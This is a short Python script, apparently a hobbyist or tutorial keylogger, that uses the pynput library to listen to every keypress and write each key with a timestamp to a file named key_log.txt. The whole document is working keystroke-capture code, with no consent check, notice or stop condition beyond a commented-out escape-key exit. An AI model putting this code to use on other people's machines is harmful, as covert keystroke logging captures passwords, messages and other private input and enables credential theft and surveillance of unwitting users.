# library
from pynput.keyboard import Key, Listener
#vanilla
import logging 

# make a log file
log_directory = ""

logging.basicConfig(filename=(log_directory + "key_log.txt"), level=logging.DEBUG, format='%(asctime)s: %(message)s:')

def on_press(key):
    logging.info(str(key))
    # if key == Key.escape:
        #return false

with Listener(on_press=on_press) as listener:
    listener.join()